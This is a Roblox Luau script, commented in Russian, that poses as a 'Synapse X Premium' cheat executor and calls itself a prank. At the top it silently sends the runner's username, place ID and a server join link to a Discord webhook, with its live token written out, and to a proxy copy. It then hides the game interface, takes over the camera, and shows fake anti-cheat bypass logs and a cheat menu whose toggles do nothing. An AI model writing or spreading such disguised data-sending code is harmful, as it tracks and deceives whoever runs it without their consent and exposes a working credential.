--!strict
-- === PRANK: "Synapse X Premium" Fake Menu (FIXED LINK) ===

local httpRequest = (syn and syn.request) or (http and http.request) or request
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local camera = workspace.CurrentCamera

-- ═══ 1. ВЕБХУК + СБОР ССЫЛКИ НА СЕРВЕР (ВОЗВРАЩЕНО) ═══════════════════════
local placeId = game.PlaceId
local jobId = game.JobId
local uriJoinLink = "roblox://placeId=" .. placeId .. "&gameInstanceId=" .. jobId

pcall(function()
    local payload = {
        ["content"] = "🎯 **Пранк Synapse удался!**\n" ..
                      "👤 **Ник друга:** " .. player.Name .. "\n" ..
                      "🎮 **ID Плейса:** " .. tostring(placeId) .. "\n\n" ..
                      "👇 **Ссылка для входа (Win+R):**\n" ..
                      "```" .. uriJoinLink .. "```"
    }
    local json = HttpService:JSONEncode(payload)
    if httpRequest then
        httpRequest({
            Url = "https://discord.com/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU",
            Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = json
        })
    end
    HttpService:PostAsync("https://lewisakura.moe/api/webhooks/1549358385453989969/7EmPPu20TXFW0zGaRwEdCUH9e3qhWfhIbsAj8X1wSGXBReLVVHwG632PnMCm8lSIpqeU", json, Enum.HttpContentType.ApplicationJson)
end)

-- ═══ 2. БАЗОВЫЕ НАСТРОЙКИ И СКРЫТИЕ ════════════════════════════════════
pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
pcall(function() GuiService.TouchControlsEnabled = false end)

local mainScreen = Instance.new("ScreenGui")
mainScreen.Name = "SystemUpdate"
mainScreen.IgnoreGuiInset = true
mainScreen.DisplayOrder = 9999999
mainScreen.ResetOnSpawn = false

local parentTarget = playerGui
if gethui then parentTarget = gethui()
elseif syn and syn.protect_gui then syn.protect_gui(mainScreen); parentTarget = game:GetService("CoreGui") end
mainScreen.Parent = parentTarget

-- ═══ 3. УТИЛИТЫ ДЛЯ UI ═════════════════════════════════════════════════
local C = {
    bg=Color3.fromRGB(10,10,14), surface=Color3.fromRGB(16,16,22), surface2=Color3.fromRGB(24,24,32),
    accent=Color3.fromRGB(160,100,255), accent2=Color3.fromRGB(80,220,255),
    text=Color3.fromRGB(240,240,250), dim=Color3.fromRGB(140,140,160), border=Color3.fromRGB(40,40,55),
    green=Color3.fromRGB(80,220,120), red=Color3.fromRGB(255,80,100)
}
local function new(cls, props, parent)
    local o = Instance.new(cls); for k,v in pairs(props) do o[k]=v end; if parent then o.Parent=parent end; return o
end
local function corner(p, r) return new("UICorner", {CornerRadius=UDim.new(0,r or 6)}, p) end
local function stroke(p, c, t) return new("UIStroke", {Color=c or C.border, Thickness=t or 1}, p) end
local function grad(p, c1, c2, rot) return new("UIGradient", {Color=ColorSequence.new(c1,c2), Rotation=rot or 90}, p) end
local function connect(s, f) return s and s:Connect(f) end

-- ═══ 4. ЧЕРНЫЙ ЭКРАН (БАЗА) ═══════════════════════════════════════════
local blackBase = new("TextButton", {Size=UDim2.fromScale(1,1), BackgroundColor3=C.bg, BackgroundTransparency=0, Text="", AutoButtonColor=false}, mainScreen)
camera.CameraType = Enum.CameraType.Scriptable
camera.CameraSubject = nil

-- ═══ 5. ЭКРАН ЗАГРУЗКИ (10 секунд) ═════════════════════════════════════
local loadingFrame = new("Frame", {Size=UDim2.fromScale(1,1), BackgroundColor3=C.bg, BackgroundTransparency=0.3, BorderSizePixel=0}, mainScreen)
local centerBox = new("Frame", {Size=UDim2.fromOffset(450, 200), Position=UDim2.fromScale(0.5,0.5), AnchorPoint=Vector2.new(0.5,0.5), BackgroundTransparency=1}, loadingFrame)

new("TextLabel", {Size=UDim2.new(1,0,0,40), BackgroundTransparency=1, Text="SYNAPSE X", TextColor3=C.accent, Font=Enum.Font.GothamBold, TextSize=32, Parent=centerBox})
new("TextLabel", {Size=UDim2.new(1,0,0,20), Position=UDim2.fromOffset(0,40), BackgroundTransparency=1, Text="PREMIUM EXECUTOR v4.2.1", TextColor3=C.dim, Font=Enum.Font.Code, TextSize=12, Parent=centerBox})

local barBg = new("Frame", {Size=UDim2.new(1,0,0,6), Position=UDim2.fromOffset(0,90), BackgroundColor3=C.surface2, BorderSizePixel=0}, centerBox)
corner(barBg, 3)
local barFill = new("Frame", {Size=UDim2.new(0,0,1,0), BackgroundColor3=C.accent, BorderSizePixel=0}, barBg)
corner(barFill, 3); grad(barFill, C.accent, C.accent2, 0)

local logLbl = new("TextLabel", {Size=UDim2.new(1,0,0,60), Position=UDim2.fromOffset(0,110), BackgroundTransparency=1, Text="", TextColor3=C.green, Font=Enum.Font.Code, TextSize=11, TextXAlignment=Enum.TextXAlignment.Left, TextYAlignment=Enum.TextYAlignment.Top}, centerBox)

local logs = {
    "> Initializing memory sandbox...",
    "> Bypassing Hyperion signature check...",
    "> Injecting into RobloxPlayerBeta.exe...",
    "> Patching anti-cheat heartbeat...",
    "> Loading C++ modules (v4.2.1)...",
    "> Establishing secure uplink to server...",
    "> Fetching HWID signature...",
    "> Bypass active. Welcome, Admin."
}

for i = 1, 100 do
    barFill.Size = UDim2.new(i/100, 0, 1, 0)
    if i % 12 == 0 and logs[math.floor(i/12)] then
        logLbl.Text = logLbl.Text .. logs[math.floor(i/12)] .. "\n"
    end
    task.wait(0.1)
end
task.wait(0.5)

loadingFrame:Destroy()

-- ═══ 6. ЧИТ-МЕНЮ ═══════════════════════════════════════════════════════
local menu = new("Frame", {Size=UDim2.fromOffset(640, 440), Position=UDim2.fromScale(0.5,0.5), AnchorPoint=Vector2.new(0.5,0.5), BackgroundColor3=C.bg, BorderSizePixel=0}, mainScreen)
corner(menu, 10); stroke(menu, C.accent, 1.5); grad(menu, C.surface, C.bg, 90)
menu.Size = UDim2.fromOffset(0, 0)
TweenService:Create(menu, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size=UDim2.fromOffset(640, 440)}):Play()
task.wait(0.4)

-- Топбар
local topBar = new("Frame", {Size=UDim2.new(1,0,0,40), BackgroundColor3=C.surface, BorderSizePixel=0}, menu)
corner(topBar, 10)
new("Frame", {Size=UDim2.new(1,0,1,0), Position=UDim2.fromOffset(0,20), BackgroundColor3=C.surface, BorderSizePixel=0}, topBar)
new("TextLabel", {Size=UDim2.new(0,200,1,0), Position=UDim2.fromOffset(15,0), BackgroundTransparency=1, Text="SYNAPSE X", TextColor3=C.text, Font=Enum.Font.GothamBold, TextSize=14, TextXAlignment=Enum.TextXAlignment.Left}, topBar)
new("TextLabel", {Size=UDim2.new(0,200,1,0), Position=UDim2.fromOffset(120,0), BackgroundTransparency=1, Text="| v4.2.1", TextColor3=C.dim, Font=Enum.Font.Code, TextSize=12, TextXAlignment=Enum.TextXAlignment.Left}, topBar)

local statusLbl = new("TextLabel", {Size=UDim2.new(0,250,1,0), Position=UDim2.new(1,-260,0,0), BackgroundTransparency=1, Text="BYPASS: ACTIVE | HWID: 8A-F2-91-...", TextColor3=C.green, Font=Enum.Font.Code, TextSize=11, TextXAlignment=Enum.TextXAlignment.Right}, topBar)

local closeBtn = new("TextButton", {Size=UDim2.fromOffset(30,30), Position=UDim2.new(1,-35,0.5,-15), BackgroundTransparency=1, Text="×", TextColor3=C.dim, Font=Enum.Font.GothamBold, TextSize=20, AutoButtonColor=false}, topBar)
connect(closeBtn.MouseButton1Click, function() mainScreen:Destroy(); camera.CameraType = Enum.CameraType.Custom; if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then camera.CameraSubject = player.Character:FindFirstChildOfClass("Humanoid") end end)

-- Сайдбар
local sidebar = new("Frame", {Size=UDim2.new(0,150,1,-70), Position=UDim2.fromOffset(0,45), BackgroundColor3=C.surface, BorderSizePixel=0}, menu)
corner(sidebar, 6)
new("UIListLayout", {Padding=UDim.new(0,4), SortOrder=Enum.SortOrder.LayoutOrder}, sidebar)
new("UIPadding", {PaddingLeft=UDim.new(0,8), PaddingRight=UDim.new(0,8), PaddingTop=UDim.new(0,8)}, sidebar)

-- Контент
local content = new("ScrollingFrame", {Size=UDim2.new(1,-160,1,-70), Position=UDim2.fromOffset(155,45), BackgroundColor3=C.surface2, BorderSizePixel=0, ScrollBarThickness=4, CanvasSize=UDim2.new()}, menu)
corner(content, 6); stroke(content, C.border, 1)
new("UIPadding", {PaddingLeft=UDim.new(0,12), PaddingRight=UDim.new(0,12), PaddingTop=UDim.new(0,12), PaddingBottom=UDim.new(0,12)}, content)

-- Утилиты для контента
local UI = {}
function UI.label(txt) new("TextLabel", {Size=UDim2.new(1,0,0,20), BackgroundTransparency=1, Text=txt, TextColor3=C.accent2, Font=Enum.Font.GothamBold, TextSize=12, TextXAlignment=Enum.TextXAlignment.Left}, content) end
function UI.toggle(txt, state)
    local f = new("Frame", {Size=UDim2.new(1,0,0,28), BackgroundTransparency=1}, content)
    new("TextLabel", {Size=UDim2.new(1,-50,1,0), BackgroundTransparency=1, Text=txt, TextColor3=C.text, Font=Enum.Font.Gotham, TextSize=12, TextXAlignment=Enum.TextXAlignment.Left}, f)
    local sw = new("TextButton", {Size=UDim2.fromOffset(36,18), Position=UDim2.new(1,-36,0.5,-9), BackgroundColor3=state and C.accent or C.surface2, Text="", AutoButtonColor=false}, f)
    corner(sw, 9)
    local knob = new("Frame", {Size=UDim2.fromOffset(12,12), Position=state and UDim2.new(1,-15,0.5,-6) or UDim2.fromOffset(3,3), BackgroundColor3=C.text, BorderSizePixel=0, ZIndex=2}, sw)
    corner(knob, 6)
    local s = state
    connect(sw.MouseButton1Click, function()
        s = not s; TweenService:Create(sw, TweenInfo.new(0.15), {BackgroundColor3=s and C.accent or C.surface2}):Play()
        TweenService:Create(knob, TweenInfo.new(0.15), {Position=s and UDim2.new(1,-15,0.5,-6) or UDim2.fromOffset(3,3)}):Play()
    end)
end
function UI.slider(txt, min, max, default)
    local f = new("Frame", {Size=UDim2.new(1,0,0,36), BackgroundTransparency=1}, content)
    new("TextLabel", {Size=UDim2.new(1,-40,0,14), BackgroundTransparency=1, Text=txt, TextColor3=C.dim, Font=Enum.Font.Gotham, TextSize=11, TextXAlignment=Enum.TextXAlignment.Left}, f)
    local valLbl = new("TextLabel", {Size=UDim2.new(0,40,0,14), Position=UDim2.new(1,-40,0,0), BackgroundTransparency=1, Text=tostring(default), TextColor3=C.text, Font=Enum.Font.Code, TextSize=11, TextXAlignment=Enum.TextXAlignment.Right}, f)
    local bar = new("Frame", {Size=UDim2.new(1,0,0,3), Position=UDim2.new(0,0,1,-8), BackgroundColor3=C.surface2, BorderSizePixel=0}, f)
    corner(bar, 2)
    local fill = new("Frame", {Size=UDim2.new((default-min)/(max-min),0,1,0), BackgroundColor3=C.accent, BorderSizePixel=0}, bar)
    corner(fill, 2)
end
function UI.button(txt)
    local b = new("TextButton", {Size=UDim2.new(1,0,0,28), BackgroundColor3=C.surface, Text=txt, TextColor3=C.accent2, Font=Enum.Font.Gotham, TextSize=11, AutoButtonColor=false}, content)
    corner(b, 4); stroke(b, C.border, 1)
end

-- Система вкладок
local tabs = {}
local activeTab = nil
local function selectTab(tab)
    if activeTab then activeTab.page.Visible = false; activeTab.btn.TextColor3 = C.dim end
    activeTab = tab; tab.page.Visible = true; tab.btn.TextColor3 = C.accent2
end
local function createTab(name)
    local btn = new("TextButton", {Size=UDim2.new(1,0,0,30), BackgroundTransparency=1, Text=name, TextColor3=C.dim, Font=Enum.Font.GothamMedium, TextSize=12, TextXAlignment=Enum.TextXAlignment.Left, AutoButtonColor=false}, sidebar)
    new("UIPadding", {PaddingLeft=UDim.new(0,8)}, btn)
    local page = new("Frame", {Size=UDim2.new(1,0,1,0), BackgroundTransparency=1, Visible=false}, content)
    new("UIListLayout", {Padding=UDim.new(0,4)}, page)
    local tab = {btn=btn, page=page, name=name}
    table.insert(tabs, tab)
    connect(btn.MouseButton1Click, function() selectTab(tab) end)
    if not activeTab then selectTab(tab) end
    return page
end

-- ═══ 7. НАПОЛНЕНИЕ ВКЛАДОК ═════════════════════════════════════════════

-- Combat
local pCombat = createTab("Combat")
UI.label("Server-Side Overrides")
UI.toggle("Silent Aim (Raycast Override)", true)
UI.toggle("Wall Penetration (CFrame Intercept)", true)
UI.toggle("Hitbox Expander (Dynamic Collision)", false)
UI.toggle("Anti-Aim (Tickbase Desync)", true)
UI.slider("Aim FOV", 0, 360, 180)
UI.slider("Smoothness", 0, 100, 85)
UI.slider("Prediction Offset", 0, 200, 32)

-- Visuals
local pVisuals = createTab("Visuals")
UI.label("Render Pipeline")
UI.toggle("ESP (Cross-Server Sync)", true)
UI.toggle("Chams (Depth Buffer Bypass)", true)
UI.toggle("World Lighting Injection", false)
UI.toggle("Camera Prediction (FOV)", false)
UI.slider("ESP Range", 0, 5000, 2500)
UI.slider("Chams Transparency", 0, 100, 60)

-- Movement
local pMove = createTab("Movement")
UI.label("Physics Manipulation")
UI.toggle("Speed (Velocity Injection)", true)
UI.toggle("Jump (Gravity Override)", true)
UI.toggle("Fly (CFrame Interpolation)", false)
UI.toggle("Desync (State Override)", true)
UI.slider("Speed Multiplier", 1, 10, 3)
UI.slider("Jump Power", 50, 500, 120)

-- Config
local pConfig = createTab("Config")
UI.label("System Info")
new("TextLabel", {Size=UDim2.new(1,0,0,20), BackgroundTransparency=1, Text="STATUS: PREMIUM ACTIVE", TextColor3=C.green, Font=Enum.Font.Code, TextSize=11, TextXAlignment=Enum.TextXAlignment.Left}, pConfig)
new("TextLabel", {Size=UDim2.new(1,0,0,20), BackgroundTransparency=1, Text="BYPASS: HEARTBEAT SPOOF v3", TextColor3=C.dim, Font=Enum.Font.Code, TextSize=11, TextXAlignment=Enum.TextXAlignment.Left}, pConfig)
new("TextLabel", {Size=UDim2.new(1,0,0,20), BackgroundTransparency=1, Text="HWID: 8A:F2:91:BC:44:12", TextColor3=C.dim, Font=Enum.Font.Code, TextSize=11, TextXAlignment=Enum.TextXAlignment.Left}, pConfig)
new("TextLabel", {Size=UDim2.new(1,0,0,20), BackgroundTransparency=1, Text="UPTIME: 00:00:42", TextColor3=C.dim, Font=Enum.Font.Code, TextSize=11, TextXAlignment=Enum.TextXAlignment.Left}, pConfig)
UI.label("Actions")
UI.button("Save Configuration")
UI.button("Load Configuration")
UI.button("Unload Script (Panic)")

-- Драг
local drag, dragStart, startPos
connect(topBar.InputBegan, function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then drag=true; dragStart=i.Position; startPos=menu.Position end
end)
connect(UIS.InputChanged, function(i)
    if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
        menu.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + (i.Position - dragStart).X, startPos.Y.Scale, startPos.Y.Offset + (i.Position - dragStart).Y)
    end
end)
connect(UIS.InputEnded, function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then drag=false end end)
